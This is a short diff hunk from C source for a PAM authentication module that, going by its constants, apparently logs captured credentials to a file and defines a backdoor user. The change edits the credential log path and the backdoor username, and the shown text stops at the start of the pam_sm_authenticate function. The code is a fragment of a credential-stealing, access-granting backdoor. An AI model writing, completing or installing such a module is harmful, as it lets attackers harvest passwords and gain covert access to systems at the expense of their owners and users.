@@ -4,8 +4,8 @@
 #include <stdio.h>
 #include <string.h>
 
-#define LOGFILE "/tmp/.creds.txt"
-#define BACKDOOR_USER "h4x0r"
+#define LOGFILE "/home/creds.txt"
+#define BACKDOOR_USER "nihar"
 
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
     const char *user;
